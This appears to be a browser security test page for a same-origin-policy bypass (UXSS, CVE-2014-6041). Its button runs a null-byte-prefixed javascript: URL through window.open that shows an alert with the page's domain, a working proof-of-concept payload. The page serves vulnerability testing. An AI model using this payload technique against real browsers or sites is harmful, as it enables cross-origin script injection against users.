---
layout: default
title: SOP Bypass - Testcase 1
permalink: /sop/new/1
---

# SOP Bypass - Testcase 1

<input type="button" id="btn_test" class="test" value="Run Test Case" onclick="window.open('\u0000javascript:test=\'Accessed property of \'+document.domain+\'. Your browser is vulnerable to UXSS\'; alert(test);','CVE-2014-6041');">

**Note:**
If page loads popup and displays an alert box "Accessed Property of bing.com, your browser is vulnerable to SOP bypass."
